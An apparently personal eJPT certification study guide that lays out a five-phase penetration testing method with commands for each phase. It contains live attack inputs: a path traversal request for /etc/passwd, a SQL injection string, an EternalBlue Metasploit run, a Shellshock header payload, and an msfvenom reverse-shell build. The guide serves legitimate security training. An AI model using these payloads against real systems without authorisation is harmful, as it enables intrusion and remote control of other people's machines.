---
title: "eJPT Study Guide - Full Penetration Testing Framework"
topic: "eJPT Methodology"
exam_objective: "Comprehensive framework covering all eJPT testing phases with practical labs"
difficulty: "Medium"
tools:
  - "nmap"
  - "metasploit"
  - "burp suite"
  - "dirb"
  - "enum4linux"
related_labs:
  - "networking-fundamentals.md"
  - "linux-essentials.md"
  - "information-gathering-basics.md"
file_path: "01-theory-foundations/ejpt-study-guide.md"
author: "Sarah Ashour"
version: "3.0"
last_updated: "2025-10-03"
license: "Educational Use Only"
tags:
  - "methodology"
  - "framework"
  - "pentesting"
  - "ejpt"
---

# 🎯 eJPT Study Guide - Full Penetration Testing Framework

**This guide is a full and simple study resource for the eJPT exam.**  
It contains all steps, commands, labs, and tips in **easy English**.

**📍 File Location:** `01-theory-foundations/ejpt-study-guide.md`

---

## 📑 Table of Contents
- [Introduction](#introduction)
- [The 5 Phases of Testing](#the-5-phases-of-testing)
- [Phase 1: Information Gathering](#phase-1-information-gathering)
- [Phase 2: Assessment & Vulnerability Analysis](#phase-2-assessment--vulnerability-analysis)
- [Phase 3: Exploitation](#phase-3-exploitation)
- [Phase 4: Post-Exploitation](#phase-4-post-exploitation)
- [Phase 5: Reporting](#phase-5-reporting)
- [Exam Success Guide](#exam-success-guide)
- [Complete Lab Example](#complete-lab-example)
- [Common Problems](#common-problems)
- [Quick Reference](#quick-reference)
- [Integration with Tools](#integration-with-tools)
- [Documentation Templates](#documentation-templates)
- [Learning Resources](#learning-resources)
- [Study Schedule](#study-schedule)
- [Emergency Help](#emergency-help)
- [Final Tips](#final-tips)
- [Cheat Sheet](#cheat-sheet)
- [Evidence Naming Template](#evidence-naming-template)
- [Checklist](#checklist)
- [Changelog](#changelog)

---

## Introduction

The **eJPT (eLearnSecurity Junior Penetration Tester)** exam is practical.  
You must follow a **clear step-by-step process**.  
This guide is your roadmap.

Why use this guide?
- Clear steps to follow
- Practical examples
- Easy commands to copy
- Includes exam tips
- Good for labs and practice

---

## The 5 Phases of Testing

| Phase | Goal | % of Time | % of Exam |
|-------|------|-----------|-----------|
| 1️⃣ Info Gathering | Find hosts, ports, services | 20-30% | 20% |
| 2️⃣ Assessment | Find vulnerabilities | 15-25% | 25% |
| 3️⃣ Exploitation | Break in, get access | 35-45% | 35% |
| 4️⃣ Post-Exploitation | Escalate, explore | 10-20% | 15% |
| 5️⃣ Reporting | Document results | 5-10% | 5% |

Essential Tools:
```bash
which nmap
which msfconsole
which dirb
which enum4linux
```

---

## Phase 1: Information Gathering

Goals:
1. Find live hosts
2. Scan for open ports
3. Identify services and versions
4. Build target profile

### Steps

**Host Discovery**
```bash
nmap -sn 192.168.1.0/24
arp-scan -l
netdiscover -r 192.168.1.0/24
```

**Port Scanning**
```bash
nmap -F target_ip
nmap -p- target_ip
nmap -sV -p 22,80,445 target_ip
```

**Service Enumeration**
```bash
whatweb http://target
dirb http://target
nikto -h http://target
enum4linux target
```

Deliverables:
- List of hosts
- Open ports
- Service details

---

## Phase 2: Assessment & Vulnerability Analysis

Goals:
- Find weaknesses
- Rate risks
- Research exploits

### Steps

**Automated Scans**
```bash
nmap --script vuln target
nmap --script=smb-vuln* target
```

**Manual Tests**
```bash
curl "http://target/index.php?page=../../etc/passwd"
curl "http://target/login.php?id=1' OR '1'='1"
```

**Exploit Research**
```bash
searchsploit apache
searchsploit ms17-010
```

Risk Example:
| Vuln | Impact | Priority |
|------|--------|----------|
| MS17-010 | Critical | P1 |
| Shellshock | Critical | P1 |
| Dir Traversal | High | P2 |

---

## Phase 3: Exploitation

Goals:
- Get access
- Establish shell
- Confirm success

**Metasploit**
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
set LHOST attacker
exploit
```

**Manual**
```bash
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'id'" http://target/cgi-bin/test.cgi
```

**Payloads**
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ip LPORT=5555 -f elf > shell.elf
```

---

## Phase 4: Post-Exploitation

Goals:
- Escalate privileges
- Explore system
- Move laterally

**Linux**
```bash
sudo -l
find / -perm -4000 2>/dev/null
```

**Windows**
```powershell
whoami /all
net user
systeminfo
```

**Data**
```bash
cat /etc/passwd
dir C:\Users\
```

---

## Phase 5: Reporting

Steps:
- Collect evidence
- Write findings
- Provide solutions

Folder setup:
```bash
mkdir -p evidence/{recon,vulns,exploits,post}
```

---

## Exam Success Guide

- 72 hours total
- 35 questions
- Passing: 70%
- All hands-on

Tips:
- Take screenshots
- Save all commands
- Document as you go
- Take breaks

---

## Complete Lab Example

Network: `10.10.10.0/24`  
Targets: 4 systems

Findings:
- Web server vulnerable to Shellshock
- File server vulnerable to MS17-010
- Both compromised

---

## Common Problems

- Nmap not finding hosts → use `-Pn` or arp-scan  
- Exploit fails → confirm vuln first  
- Web shell fails → try other extensions  
- Shell drops → upgrade with `pty.spawn`

---

## Quick Reference

```bash
nmap -sn subnet
nmap -sC -sV -p- target
dirb http://target
enum4linux target
msfconsole
```

---

## Integration with Tools

- Combine masscan + nmap
- Chain gobuster + nikto
- Use linpeas for Linux
- Use PowerUp for Windows

---

## Documentation Templates

Quick Findings:
```markdown
## Critical Finding
- Vuln: MS17-010
- Host: 10.10.10.15
- Access: SYSTEM
```

---

## Learning Resources

- INE PTS Course
- TryHackMe
- HackTheBox
- DVWA

---

## Study Schedule

**8 Weeks**

Weeks 1-2: Basics  
Weeks 3-4: Info gathering  
Weeks 5-6: Exploitation  
Weeks 7-8: Practice labs + docs

Daily: 60-90 mins

---

## Emergency Help

- Update tools
- Ping + traceroute
- Check logs
- Use forums / Discord

---

## Final Tips

- Be calm
- Follow steps
- Document everything
- Sleep during exam

---

## Cheat Sheet

```bash
nmap -sn subnet
nmap -sC -sV target
dirb http://target
enum4linux target
msfconsole
```

---

## Evidence Naming Template

```
evidence/
├── recon/10.10.10.5_nmap.txt
├── vulns/10.10.10.5_vuln.txt
├── exploit/10.10.10.15_ms17-010.png
├── post/10.10.10.5_root.png
```

---

## Checklist

- [ ] Hosts found
- [ ] Ports scanned
- [ ] Services identified
- [ ] Vulns confirmed
- [ ] Exploits tested
- [ ] Evidence saved
- [ ] Report written

---

## Changelog
- v3.0 (2025-10-03) — Full study guide, simplified English
- v2.2 (2025-01-19) — Methodology expanded
- v2.1 (2025-01-15) — First release
